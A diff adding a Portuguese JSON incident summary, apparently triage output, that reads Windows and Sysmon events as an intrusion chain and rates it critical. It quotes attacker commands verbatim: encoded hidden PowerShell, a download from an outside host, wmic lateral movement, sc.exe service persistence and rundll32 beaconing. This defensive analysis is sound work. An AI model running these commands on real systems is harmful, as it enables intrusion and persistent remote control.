@@ -1,0 +1,20 @@
+{
+  "resumo_comportamental": "No host NW-WEB-GW01, a conta t.oliveira dispara Event ID 4688 com powershell.exe -NoP -W Hidden -EncodedCommand, seguido por Event ID 4104 executando Invoke-WebRequest -Uri http://cdn-updates-northwind.net/toolkit2.zip -OutFile C:\\Windows\\Temp\\toolkit2.zip e pela criação de C:\\Windows\\Temp\\toolkit2\\loader.exe (Sysmon Event ID 1), que injeta código em C:\\Windows\\explorer.exe via NtCreateThreadEx (Sysmon Event ID 10) — indicando execução inicial seguida de process injection para evasão de defesa. O loader.exe é então propagado lateralmente via cmd.exe /c wmic /node:\"NW-FILESRV03\" process call create \"cmd.exe /c C:\\Windows\\Temp\\toolkit2\\loader.exe --sync\", executando em NW-FILESRV03 e NW-SRV-APP12 por meio de WmiPrvSE.exe (Event ID 4688). Em seguida ocorre persistência: um BITS job 'MSUpdateStagingJob' (Event ID 106/107) baixa agent_payload.bin, o serviço WinTelemetryHelper é criado e iniciado via sc.exe create WinTelemetryHelper binPath= \"C:\\Windows\\Temp\\agent_payload.bin\" start= auto e sc.exe start WinTelemetryHelper (Event ID 7045/7036), e a DLL não assinada C:\\Windows\\Temp\\agent_payload\\netcfgx.dll é carregada por rundll32.exe netcfgx.dll,ServiceMain --beacon-interval 300 (Sysmon Event ID 7), evidenciando beaconing C2 ativo. O conjunto representa uma cadeia de intrusão completa (execução, injeção, movimento lateral, persistência e C2), altamente relevante para segurança; o logon do backupsvc (Event ID 4624, Logon Type 5) e o Print Spooler (Event ID 7036) em NW-SRV-APP12 são eventos de rotina não relacionados ao incidente.",
+  "entidades_identificadas": [
+    "NW-WEB-GW01",
+    "NW-FILESRV03",
+    "NW-SRV-APP12",
+    "t.oliveira",
+    "backupsvc",
+    "svc-backup",
+    "powershell.exe",
+    "loader.exe",
+    "WmiPrvSE.exe",
+    "sc.exe",
+    "WinTelemetryHelper",
+    "rundll32.exe",
+    "netcfgx.dll",
+    "cdn-updates-northwind.net"
+  ],
+  "severidade_maxima": "critical"
+}
